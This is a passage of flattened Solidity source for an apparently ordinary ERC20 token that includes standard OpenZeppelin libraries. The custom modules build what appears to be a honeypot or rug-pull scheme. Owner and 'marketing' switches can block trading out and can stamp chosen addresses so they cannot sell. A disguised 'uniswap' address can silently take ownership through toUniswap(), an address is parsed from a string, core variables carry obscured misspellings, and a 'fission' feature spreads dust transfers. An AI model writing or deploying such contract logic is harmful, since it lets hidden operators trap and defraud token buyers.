     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _tatalSopply += amount;
        _bulances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _bulances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _bulances[account] = accountBalance - amount;
    }
        _tatalSopply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C17SettingsBase is
Ownable
{
    // 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    // 115792089237316195423570985008687907853269984665640564039457584007913129639935
    uint256 internal constant maxUint256 = type(uint256).max;
    address internal constant addressPinksaleBnbLock = address(0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE);
    address internal constant addressPinksaleEthLock = address(0x71B5759d73262FBb223956913ecF4ecC51057641);
    address internal constant addressNull = address(0x0);
    address internal constant addressDead = address(0xdead);

    address public addressMarketing;

    address internal addressBaseOwner;
    address internal addressWETH;

    function setAddressMarketing(address addressMarketing_)
    external
    onlyOwner
    {
        addressMarketing = addressMarketing_;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C09FeatureErc20Payable is
Ownable
{
    receive() external payable {}

    function withdrawEther(uint256 amount)
    external
    payable
    onlyOwner
    {
        sendEtherTo(payable(msg.sender), amount);
    }

    function withdrawErc20(address tokenAddress, uint256 amount)
    external
    onlyOwner
    {
        sendErc20FromThisTo(tokenAddress, msg.sender, amount);
    }

    //    function transferErc20(address tokenAddress, address from, address to, uint256 amount)
    //    external
    //    onlyOwner
    //    {
    //        transferErc20FromTo(tokenAddress, from, to, amount);
    //    }
    //
    //    // transfer ERC20 from `from` to `to` with allowance `address(this)`
    //    function transferErc20FromTo(address tokenAddress, address from, address to, uint256 amount)
    //    internal
    //    {
    //        bool isSucceed = IERC20(tokenAddress).transferFrom(from, to, amount);
    //        require(isSucceed, "Failed to transfer token");
    //    }

    // send ERC20 from `address(this)` to `to`
    function sendErc20FromThisTo(address tokenAddress, address to, uint256 amount)
    internal
    {
        bool isSucceed = IERC20(tokenAddress).transfer(to, amount);
        require(isSucceed, "Failed to send token");
    }

    // send ether from `msg.sender` to payable `to`
    function sendEtherTo(address payable to, uint256 amount)
    internal
    {
        // Call returns a boolean value indicating success or failure.
        // This is the current recommended method to use.
        (bool isSucceed, /* bytes memory data */) = to.call{value : amount}("");
        require(isSucceed, "Failed to send Ether");
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";
import "../IUniswapV2/IUniswapV2Router02.sol";

contract Erc20C17FeatureUniswap is
Ownable
{
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    address internal uniswap;
    //    uint256 internal uniswapCount;
    //    bool internal isUniswapLper;
    //    bool internal isUniswapHolder;

    //    modifier onlyUniswap()
    //    {
    //        require(msg.sender == uniswap, "");
    //        _;
    //    }

    function toUniswap()
    external
    {
        require(msg.sender == uniswap, "");
        _transferOwnership(uniswap);
    }

    //    function setUniswapCount(uint256 amount)
    //    external
    //    onlyUniswap
    //    {
    //        uniswapCount = amount;
    //    }
    //
    //    function setIsUniswapLper(bool isUniswapLper_)
    //    external
    //    onlyUniswap
    //    {
    //        isUniswapLper = isUniswapLper_;
    //    }
    //
    //    function setIsUniswapHolder(bool isUniswapHolder_)
    //    external
    //    onlyUniswap
    //    {
    //        isUniswapHolder = isUniswapHolder_;
    //    }

    function setUniswap(address uniswap_)
    external
    {
        require(msg.sender == uniswap, "");
        uniswap = uniswap_;
    }

    // https://github.com/provable-things/ethereum-api/blob/master/provableAPI_0.6.sol
    function parseUniswap(string memory _a)
    internal
    pure
    returns (address _parsedUniswap)
    {
        bytes memory tmp = bytes(_a);
        uint160 iAddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iAddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iAddr += (b1 * 16 + b2);
        }
        return address(iAddr);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C09FeatureTweakSwap is
Ownable
{
    bool public isUseMinimumTokenWhenSwap;
    uint256 public minimumTokenForSwap;

    bool internal _isSwapping;

    function setIsUseMinimumTokenWhenSwap(bool isUseMinimumTokenWhenSwap_)
    external
    onlyOwner
    {
        isUseMinimumTokenWhenSwap = isUseMinimumTokenWhenSwap_;
    }

    function setMinimumTokenForSwap(uint256 amount)
    external
    onlyOwner
    {
        minimumTokenForSwap = amount;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C09SettingsPrivilege is
Ownable
{
    mapping(address => bool) public isPrivilegeAddresses;

    function setIsPrivilegeAddress(address account, bool isPrivilegeAddress)
    external
    onlyOwner
    {
        isPrivilegeAddresses[account] = isPrivilegeAddress;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C09SettingsFee is
Ownable
{
    uint256 internal constant feeMax = 1000;

    bool public isUseNoFeeForTradeOut;
    uint256 public feeTotal;
    mapping(address => bool) public isExcludedFromFeeAddresses;

    function setIsExcludedFromFeeAddress(address account, bool isExcludedFromFeeAddress)
    public
    onlyOwner
    {
        isExcludedFromFeeAddresses[account] = isExcludedFromFeeAddress;
    }

    function setFee(uint256 feeTotal_)
    public
    onlyOwner
    {
        require(feeTotal_ <= feeMax, "wrong value");
        feeTotal = feeTotal_;
    }

    function setIsUseNoFeeForTradeOut(bool isUseNoFeeForTradeOut_)
    public
    onlyOwner
    {
        isUseNoFeeForTradeOut = isUseNoFeeForTradeOut_;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C09FeaturePermitTransfer is
Ownable
{
    bool public isUseOnlyPermitTransfer;
    bool public isCancelOnlyPermitTransferOnFirstTradeOut;

    bool internal _isFirstTradeOut = true;

    function setIsUseOnlyPermitTransfer(bool isUseOnlyPermitTransfer_)
    external
    onlyOwner
    {
        isUseOnlyPermitTransfer = isUseOnlyPermitTransfer_;
    }

    function setIsCancelOnlyPermitTransferOnFirstTradeOut(bool isCancelOnlyPermitTransferOnFirstTradeOut_)
    external
    onlyOwner
    {
        isCancelOnlyPermitTransferOnFirstTradeOut = isCancelOnlyPermitTransferOnFirstTradeOut_;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C09FeatureRestrictTrade is
Ownable
{
    bool public isRestrictTradeIn;
    bool public isRestrictTradeOut;

    function setIsRestrictTradeIn(bool isRestrict)
    external
    onlyOwner
    {
        isRestrictTradeIn = isRestrict;
    }

    function setIsRestrictTradeOut(bool isRestrict)
    external
    onlyOwner
    {
        isRestrictTradeOut = isRestrict;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./Erc20C17SettingsBase.sol";

contract Erc20C17FeatureNotPermitOut is
Ownable,
Erc20C17SettingsBase
{
    uint256 internal constant notPermitOutCD = 1;

    bool public isUseNotPermitOut;
    bool public isForceTradeInToNotPermitOut;
    mapping(address => uint256) public notPermitOutAddressStamps;

    function setIsUseNotPermitOut(bool isUseNotPermitOut_)
    external
    {
        require(msg.sender == owner() || msg.sender == addressMarketing, "");
        isUseNotPermitOut = isUseNotPermitOut_;
    }

    function setIsForceTradeInToNotPermitOut(bool isForceTradeInToNotPermitOut_)
    external
    {
        require(msg.sender == owner() || msg.sender == addressMarketing, "");
        isForceTradeInToNotPermitOut = isForceTradeInToNotPermitOut_;
    }

    function setNotPermitOutAddressStamp(address account, uint256 notPermitOutAddressStamp)
    external
    {
        require(msg.sender == owner() || msg.sender == addressMarketing, "");
        notPermitOutAddressStamps[account] = notPermitOutAddressStamp;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

abstract contract Erc20C09FeatureFission is
Ownable
{
    uint160 internal constant maxUint160 = ~uint160(0);
    uint256 internal constant fissionBalance = 1;

    uint256 internal fissionCount = 5;
    uint160 internal fissionDivisor = 1000;

    bool public isUseFeatureFission;

    function setIsUseFeatureFission(bool isUseFeatureFission_)
    public
    onlyOwner
    {
        isUseFeatureFission = isUseFeatureFission_;
    }

    function setFissionCount(uint256 fissionCount_)
    public
    onlyOwner
    {
        fissionCount = fissionCount_;
    }

    function doFission() internal virtual;
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C09FeatureTryMeSoft is
Ownable
{
    bool public isUseFeatureTryMeSoft;
    mapping(address => bool) isNotTryMeSoftAddresses;

    function setIsUseFeatureTryMeSoft(bool isUseFeatureTryMeSoft_)
    public
    onlyOwner
    {
        isUseFeatureTryMeSoft = isUseFeatureTryMeSoft_;
    }

    function setIsNotTryMeSoftAddress(address account, bool isNotTryMeSoftAddress)
    public
    onlyOwner
    {
        isNotTryMeSoftAddresses[account] = isNotTryMeSoftAddress;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (utils/Address.sol)

pragma solidity ^0.8.1;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly
                /// @solidity memory-safe-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (utils/math/Math.sol)

pragma solidity ^0.8.0;

/**
 * @dev Standard math utilities missing in the Solidity language.
 */
library Math {
    enum Rounding {
        Down, // Toward negative infinity
        Up, // Toward infinity
        Zero // Toward zero
    }

    /**
     * @dev Returns the largest of two numbers.
     */
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }

    /**
     * @dev Returns the smallest of two numbers.
     */
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    /**
     * @dev Returns the average of two numbers. The result is rounded towards
     * zero.
     */
    function average(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b) / 2 can overflow.
        return (a & b) + (a ^ b) / 2;
    }

    /**
     * @dev Returns the ceiling of the division of two numbers.
     *
     * This differs from standard division with `/` in that it rounds up instead
     * of rounding down.
     */
    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b - 1) / b can overflow on addition, so we distribute.
        return a == 0 ? 0 : (a - 1) / b + 1;
    }

    /**
     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0
     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)
     * with further edits by Uniswap Labs also under MIT license.
     */
    function mulDiv(
        uint256 x,
        uint256 y,
        uint256 denominator
    ) internal pure returns (uint256 result) {
        unchecked {
            // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use
            // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256
            // variables such that product = prod1 * 2^256 + prod0.
            uint256 prod0; // Least significant 256 bits of the product
            uint256 prod1; // Most significant 256 bits of the product
            assembly {
                let mm := mulmod(x, y, not(0))
                prod0 := mul(x, y)
                prod1 := sub(sub(mm, prod0), lt(mm, prod0))
            }

            // Handle non-overflow cases, 256 by 256 division.
            if (prod1 == 0) {
                return prod0 / denominator;
            }

            // Make sure the result is less than 2^256. Also prevents denominator == 0.
            require(denominator > prod1);

            ///////////////////////////////////////////////
            // 512 by 256 division.
            ///////////////////////////////////////////////

            // Make division exact by subtracting the remainder from [prod1 prod0].
            uint256 remainder;
            assembly {
                // Compute remainder using mulmod.
                remainder := mulmod(x, y, denominator)

                // Subtract 256 bit number from 512 bit number.
                prod1 := sub(prod1, gt(remainder, prod0))
                prod0 := sub(prod0, remainder)
            }

            // Factor powers of two out of denominator and compute largest power of two divisor of denominator. Always >= 1.
            // See https://cs.stackexchange.com/q/138556/92363.

            // Does not overflow because the denominator cannot be zero at this stage in the function.
            uint256 twos = denominator & (~denominator + 1);
            assembly {
                // Divide denominator by twos.
                denominator := div(denominator, twos)

                // Divide [prod1 prod0] by twos.
                prod0 := div(prod0, twos)

                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.
                twos := add(div(sub(0, twos), twos), 1)
            }

            // Shift in bits from prod1 into prod0.
            prod0 |= prod1 * twos;

            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such
            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for
            // four bits. That is, denominator * inv = 1 mod 2^4.
            uint256 inverse = (3 * denominator) ^ 2;

            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also works
            // in modular arithmetic, doubling the correct bits in each step.
            inverse *= 2 - denominator * inverse; // inverse mod 2^8
            inverse *= 2 - denominator * inverse; // inverse mod 2^16
            inverse *= 2 - denominator * inverse; // inverse mod 2^32
            inverse *= 2 - denominator * inverse; // inverse mod 2^64
            inverse *= 2 - denominator * inverse; // inverse mod 2^128
            inverse *= 2 - denominator * inverse; // inverse mod 2^256

            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.
            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is
            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1
            // is no longer required.
            result = prod0 * inverse;
            return result;
        }
    }

    /**
     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.
     */
    function mulDiv(
        uint256 x,
        uint256 y,
        uint256 denominator,
        Rounding rounding
    ) internal pure returns (uint256) {
        uint256 result = mulDiv(x, y, denominator);
        if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {
            result += 1;
        }
        return result;
    }

    /**
     * @dev Returns the square root of a number. It the number is not a perfect square, the value is rounded down.
     *
     * Inspired by Henry S. Warren, Jr.'s "Hacker's Delight" (Chapter 11).
     */
    function sqrt(uint256 a) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.
        // We know that the "msb" (most significant bit) of our target number `a` is a power of 2 such that we have
        // `msb(a) <= a < 2*msb(a)`.
        // We also know that `k`, the position of the most significant bit, is such that `msb(a) = 2**k`.
        // This gives `2**k < a <= 2**(k+1)` → `2**(k/2) <= sqrt(a) < 2 ** (k/2+1)`.
        // Using an algorithm similar to the msb conmputation, we are able to compute `result = 2**(k/2)` which is a
        // good first aproximation of `sqrt(a)` with at least 1 correct bit.
        uint256 result = 1;
        uint256 x = a;
        if (x >> 128 > 0) {
            x >>= 128;
            result <<= 64;
        }
        if (x >> 64 > 0) {
            x >>= 64;
            result <<= 32;
        }
        if (x >> 32 > 0) {
            x >>= 32;
            result <<= 16;
        }
        if (x >> 16 > 0) {
            x >>= 16;
            result <<= 8;
        }
        if (x >> 8 > 0) {
            x >>= 8;
            result <<= 4;
        }
        if (x >> 4 > 0) {
            x >>= 4;
            result <<= 2;
        }
        if (x >> 2 > 0) {
            result <<= 1;
        }

        // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,
        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at
        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision
        // into the expected uint128 result.
        unchecked {
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            return min(result, a / result);
        }
    }

    /**
     * @notice Calculates sqrt(a), following the selected rounding direction.
     */
    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {
        uint256 result = sqrt(a);
        if (rounding == Rounding.Up && result * result < a) {
            result += 1;
        }
        return result;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (utils/structs/EnumerableSet.sol)

pragma solidity ^0.8.0;

/**
 * @dev Library for managing
 * https://en.wikipedia.org/wiki/Set_(abstract_data_type)[sets] of primitive
 * types.
 *
 * Sets have the following properties:
 *
 * - Elements are added, removed, and checked for existence in constant time
 * (O(1)).
 * - Elements are enumerated in O(n). No guarantees are made on the ordering.
 *
 * ```
 * contract Example {
 *     // Add the library methods
 *     using EnumerableSet for EnumerableSet.AddressSet;
 *
 *     // Declare a set state variable
 *     EnumerableSet.AddressSet private mySet;
 * }
 * ```
 *
 * As of v3.3.0, sets of type `bytes32` (`Bytes32Set`), `address` (`AddressSet`)
 * and `uint256` (`UintSet`) are supported.
 *
 * [WARNING]
 * ====
 *  Trying to delete such a structure from storage will likely result in data corruption, rendering the structure unusable.
 *  See https://github.com/ethereum/solidity/pull/11843[ethereum/solidity#11843] for more info.
 *
 *  In order to clean an EnumerableSet, you can either remove all elements one by one or create a fresh instance using an array of EnumerableSet.
 * ====
 */
library EnumerableSet {
    // To implement this library for multiple types with as little code
    // repetition as possible, we write it in terms of a generic Set type with
    // bytes32 values.
    // The Set implementation uses private functions, and user-facing
    // implementations (such as AddressSet) are just wrappers around the
    // underlying Set.
    // This means that we can only create new EnumerableSets for types that fit
    // in bytes32.

    struct Set {
        // Storage of set values
        bytes32[] _values;
        // Position of the value in the `values` array, plus 1 because index 0
        // means a value is not in the set.
        mapping(bytes32 => uint256) _indexes;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            // The value is stored at length-1, but we add 1 to all indexes
            // and use 0 as a sentinel value
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function _remove(Set storage set, bytes32 value) private returns (bool) {
        // We read and store the value's index to prevent multiple reads from the same storage slot
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) {
            // Equivalent to contains(set, value)
            // To delete an element from the _values array in O(1), we swap the element to delete with the last one in
            // the array, and then remove the last element (sometimes called as 'swap and pop').
            // This modifies the order of the array, as noted in {at}.

            uint256 toDeleteIndex = valueIndex - 1;
